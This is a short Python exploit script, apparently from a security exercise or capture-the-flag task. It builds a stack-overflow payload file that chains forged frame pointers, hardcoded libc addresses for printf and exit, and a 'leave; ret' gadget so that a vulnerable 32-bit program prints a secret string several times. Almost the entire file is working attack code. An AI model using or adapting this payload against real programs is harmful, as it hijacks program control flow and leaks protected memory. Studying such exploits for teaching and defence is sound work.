#!/usr/bin/env python

"""
Want to call printf("%s\n", &secret) twice.
num args for printf = 2.

buffer
...
$ebp + 5     <- ebp
&printf
&leave; ret;
&fmt_string
&secret
$ebp + 10
&printf
&leave; ret;
&fmt_string
&secret
$ebp + 15
&printf
$leave; ret;
&fmt_string
&secret
blank
&printf
&exit
&fmt_string
&secret
fmt_string
"""

buff = '\x38\xd3\xff\xff'
ebp = '\x68\xd3\xff\xff'
base_offset = 48 # $ebp - &buff
ebp_5 = '\x7c\xd3\xff\xff'
ebp_10 = '\x90\xd3\xff\xff'
ebp_15 = '\xa4\xd3\xff\xff'
ebp_20 = '\xb8\xd3\xff\xff'
printf = '\x60\x8c\xe3\xf7'
leave_ret = '\xff\x84\x04\x08'
exit = '\x60\x80\xe1\xf7'
secret = '\x03\xd4\xff\xff'

with open('abc', 'w') as f:
    f.write(
        ''.join([
            '0' * base_offset,
            ebp_5,
            printf,
            leave_ret,
            ebp_20,
            secret,
            ebp_10,
            printf,
            leave_ret,
            ebp_20,
            secret,
            ebp_15,
            printf,
            leave_ret,
            ebp_20,
            secret,
            '0000',
            printf,
            exit,
            ebp_20,
            secret,
            '%s\n',
        ])
    )
